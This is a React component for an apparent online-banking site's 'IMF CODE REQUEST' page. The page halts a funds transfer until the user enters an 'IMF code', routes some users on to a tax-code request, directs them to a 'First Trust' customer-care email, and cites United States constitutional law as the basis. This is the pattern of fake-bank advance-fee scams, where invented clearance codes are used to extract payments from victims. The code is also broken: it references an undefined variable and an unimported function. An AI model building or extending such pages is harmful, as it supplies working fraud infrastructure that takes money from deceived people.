import React, { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import { Link, useNavigate } from "react-router-dom";
import { getMe, reset, updateImf } from "../../features/auth/user";

function IMF() {
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const [imfCode, setImfCode] = useState();

  const { userInfo, isLoading, isError, message } = useSelector(
    (state) => state.userInfo
  );

  useEffect(() => {
    if (isError) {
      console.log(message);
    }

    dispatch(getMe());

    return () => {
      dispatch(reset());
    };
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (userInfo?.imf_code !== tccCode) {
      toast.error("Invalid IMF Code");
    } else if (
      userInfo?.imf_code === imfCode &&
      userInfo?.tax_code_need === true
    ) {
      navigate("/request/tax");
    } else if (userInfo?.imf_code === imfCode) {
      dispatch(updateImf());
      // toast.success("You have Successfully Deposited");
      navigate("/transactions");
      // setInterval(() => {
      // }, 2000);
    }
  };

  return (
    <div className="code">
      <div className="code__container">
        <div className="code__header">
          <h2>IMF CODE REQUEST:</h2>
          <p>Input IMF code to Continue Transaction Process</p>
          <p>
            I don't have my IMF Code. Contact First Trust Customer Care via
            email: <Link>customer_care@firstrustfinance.com</Link>
          </p>
        </div>
        <div className="code__body">
          <h3>IMF Code</h3>
          <form onSubmit={handleSubmit}>
            <div className="form__group">
              <input
                onChange={(e) => setImfCode(e.target.value)}
                type="text"
                required
              />
              <label htmlFor="">Input IMF code</label>
            </div>
            <div className="form__group">
              <button style={{ backgroundColor: "#0a2d7e" }}>CONTINUE</button>
            </div>
          </form>

          <div className="form__group goBack">
            <button className="red_btn">GO BACK TO FUNDS TRASFER PAGE</button>
          </div>

          <p className="code__footer">
            IMF Request is in accordance to the Constitutional Laws of the
            United States governing the transfer of funds to or from a foreign
            account
          </p>
        </div>
      </div>
    </div>
  );
}

export default IMF;
